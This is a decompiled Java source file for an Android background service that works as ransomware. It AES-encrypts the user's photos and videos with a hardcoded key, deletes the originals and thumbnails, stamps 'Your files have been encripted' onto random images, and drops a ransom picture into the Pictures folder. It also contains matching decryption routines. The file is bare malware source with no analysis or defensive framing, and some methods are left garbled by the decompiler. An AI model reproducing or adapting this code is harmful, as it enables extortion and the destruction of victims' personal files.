/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.content.res.Resources
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.BitmapFactory$Options
 *  android.graphics.Canvas
 *  android.graphics.Color
 *  android.os.Environment
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.text.Layout
 *  android.text.Layout$Alignment
 *  android.text.StaticLayout
 *  android.text.TextPaint
 *  android.widget.Toast
 *  java.io.ByteArrayOutputStream
 *  java.io.File
 *  java.io.FileInputStream
 *  java.io.FileOutputStream
 *  java.io.IOException
 *  java.io.OutputStream
 *  java.lang.CharSequence
 *  java.lang.Exception
 *  java.lang.Object
 *  java.lang.Runnable
 *  java.lang.String
 *  java.lang.System
 *  java.lang.Throwable
 *  java.util.ArrayList
 *  java.util.Collection
 *  java.util.Iterator
 *  java.util.List
 *  java.util.Random
 */
package sigma.male;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.widget.Toast;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import sigma.male.Aes;

public class MyService
extends Service {
    byte[] KEY;
    List<File> al;
    String totalFiles = "";
    List<File> vids;

    public byte[] blurPhoto(File file) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.ARGB_8888;
        options.inJustDecodeBounds = false;
        Bitmap bitmap = BitmapFactory.decodeFile((String)file.getAbsolutePath(), (BitmapFactory.Options)options);
        if (bitmap == null) {
            return null;
        }
        Bitmap bitmap2 = this.drawMultilineTextToBitmap(bitmap, "Your files have been encripted.");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap2.compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)byteArrayOutputStream);
        return byteArrayOutputStream.toByteArray();
    }

    public void cleanPhotos() {
        Iterator iterator = this.al.iterator();
        while (iterator.hasNext()) {
            File file = (File)iterator.next();
            if (BitmapFactory.decodeFile((String)file.getAbsolutePath()) != null) continue;
            file.delete();
        }
        return;
    }

    /*
     * Enabled aggressive block sorting
     */
    public void decryptFile() throws Exception {
        Iterator iterator = this.al.iterator();
        do {
            if (!iterator.hasNext()) break;
            File file = (File)iterator.next();
            if (file.getPath().contains((CharSequence)".thumbnails") || file.getPath().contains((CharSequence)"brld")) {
                file.delete();
                continue;
            }
            if (!file.getPath().contains((CharSequence)".enc") || file.getPath().contains((CharSequence)".enc.enc") || file.getPath().contains((CharSequence)"brld")) continue;
            byte[] arrby = this.fullyReadFileToBytes(file);
            this.saveFile(Aes.decrypt(this.KEY, arrby), file.getPath().substring(0, -4 + file.getPath().length()));
            file.delete();
        } while (true);
        Iterator iterator2 = this.vids.iterator();
        while (iterator2.hasNext()) {
            File file = (File)iterator2.next();
            if (!file.getPath().contains((CharSequence)".enc") || file.getPath().contains((CharSequence)".enc.enc")) continue;
            Aes.decryptLarge(this.KEY, file, new File(file.getPath().substring(0, -4 + file.getPath().length())));
        }
        return;
    }

    public Bitmap drawMultilineTextToBitmap(Bitmap bitmap, String string2) {
        Bitmap.Config config = bitmap.getConfig();
        if (config == null) {
            config = Bitmap.Config.ARGB_8888;
        }
        Bitmap bitmap2 = bitmap.copy(config, true);
        Canvas canvas = new Canvas(bitmap2);
        TextPaint textPaint = new TextPaint(1);
        textPaint.setColor(Color.rgb((int)61, (int)61, (int)61));
        textPaint.setTextSize((float)14);
        textPaint.setShadowLayer(1.0f, 0.0f, 1.0f, -1);
        int n = -16 + canvas.getWidth();
        StaticLayout staticLayout = new StaticLayout((CharSequence)string2, textPaint, n, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false);
        int n2 = staticLayout.getHeight();
        float f = (bitmap2.getWidth() - n) / 2;
        float f2 = (bitmap2.getHeight() - n2) / 2;
        canvas.save();
        canvas.translate(f, f2);
        staticLayout.draw(canvas);
        canvas.restore();
        return bitmap2;
    }

    /*
     * Enabled aggressive block sorting
     */
    public void encryptFile() throws Exception {
        Iterator iterator = this.al.iterator();
        do {
            if (!iterator.hasNext()) break;
            File file = (File)iterator.next();
            if (file.getPath().contains((CharSequence)".thumbnails")) {
                file.delete();
                continue;
            }
            if (file.getPath().contains((CharSequence)"IMPORTANT.jpg") || file.getPath().contains((CharSequence)".enc") || file.getPath().contains((CharSequence)"brld_")) continue;
            if (new Random().nextInt(20) == 0) {
                this.saveFile(this.blurPhoto(file), String.valueOf((Object)file.getParentFile().getPath()) + File.separator + "brld_" + file.getName());
            }
            this.saveFile(Aes.encrypt(this.KEY, this.fullyReadFileToBytes(file)), String.valueOf((Object)file.getPath()) + ".enc");
            file.delete();
        } while (true);
        Iterator iterator2 = this.vids.iterator();
        do {
            if (!iterator2.hasNext()) {
                Bitmap bitmap = BitmapFactory.decodeResource((Resources)this.getResources(), (int)2131165276);
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)byteArrayOutputStream);
                this.saveFile(byteArrayOutputStream.toByteArray(), (Object)Environment.getExternalStorageDirectory() + File.separator + "Pictures");
                return;
            }
            File file = (File)iterator2.next();
            if (file.getPath().contains((CharSequence)".enc")) continue;
            Aes.encryptLarge(this.KEY, file, new File(String.valueOf((Object)file.getPath()) + ".enc"));
        } while (true);
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    byte[] fullyReadFileToBytes(File var1_1) throws IOException {
        var2_2 = (int)var1_1.length();
        var3_3 = new byte[var2_2];
        var4_4 = new byte[var2_2];
        var5_5 = new FileInputStream(var1_1);
        try {
            var8_6 = var5_5.read(var3_3, 0, var2_2);
            if (var8_6 >= var2_2) ** GOTO lbl11
        }
        catch (IOException var7_9) {
            try {
                throw var7_9;
            }
            catch (Throwable var6_10) {
                var5_5.close();
                throw var6_10;
            }
        }
        var9_7 = var2_2 - var8_6;
        do {
            block8 : {
                if (var9_7 > 0) break block8;
lbl11: // 2 sources:
                var5_5.close();
                return var3_3;
            }
            var10_8 = var5_5.read(var4_4, 0, var9_7);
            System.arraycopy((Object)var4_4, (int)0, (Object)var3_3, (int)(var2_2 - var9_7), (int)var10_8);
            var9_7 -= var10_8;
            continue;
            break;
        } while (true);
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Lifted jumps to return sites
     */
    List<File> getFiles(File var1_1, String[] var2_2, String[] var3_3) {
        var4_4 = new ArrayList();
        var5_5 = var1_1.listFiles();
        var6_6 = var5_5.length;
        var7_7 = 0;
        block0 : do {
            if (var7_7 >= var6_6) {
                return var4_4;
            }
            var8_8 = var5_5[var7_7];
            if (!var8_8.isDirectory()) break;
            var4_4.addAll(this.getFiles(var8_8, var2_2, var3_3));
lbl11: // 3 sources:
            do {
                ++var7_7;
                continue block0;
                break;
            } while (true);
            break;
        } while (true);
        var9_9 = var2_2.length;
        var10_10 = 0;
        do {
            if (var10_10 >= var9_9) {
                var12_12 = false;
                break;
            }
            var11_11 = var2_2[var10_10];
            if (var8_8.getPath().contains((CharSequence)var11_11)) {
                var12_12 = true;
                break;
            }
            ++var10_10;
        } while (true);
        var13_13 = var3_3.length;
        var14_14 = 0;
        do {
            block8 : {
                block7 : {
                    if (var14_14 >= var13_13) break block7;
                    var15_15 = var3_3[var14_14];
                    if (!var8_8.getPath().contains((CharSequence)var15_15)) break block8;
                    var12_12 = false;
                }
                if (!var12_12) ** GOTO lbl11
                var4_4.add((Object)var8_8);
                ** continue;
            }
            ++var14_14;
        } while (true);
    }

    public void makeToast(final String string2) {
        new Handler(Looper.getMainLooper()).post(new Runnable(){

            public void run() {
                Toast.makeText((Context)MyService.this.getApplicationContext(), (CharSequence)string2, (int)0).show();
            }
        });
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void saveFile(byte[] arrby, String string2) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(string2);
            fileOutputStream.write(arrby);
            fileOutputStream.close();
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public int startrans(String string2) {
        try {
            this.KEY = "th30neand0nly0ne".getBytes("UTF8");
            File file = new File(string2);
            this.saveFile(Aes.encrypt(this.KEY, this.fullyReadFileToBytes(file)), String.valueOf((Object)file.getPath()) + ".pkc");
            file.delete();
            do {
                return 0;
                break;
            } while (true);
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return 0;
        }
    }

    public int startrans2(String string2) {
        try {
            this.KEY = "th30neand0nly0ne".getBytes("UTF8");
            File file = new File(string2);
            byte[] arrby = this.fullyReadFileToBytes(file);
            this.saveFile(Aes.decrypt(this.KEY, arrby), file.getPath().substring(0, -4 + file.getPath().length()));
            file.delete();
            return 0;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return 0;
        }
    }

}

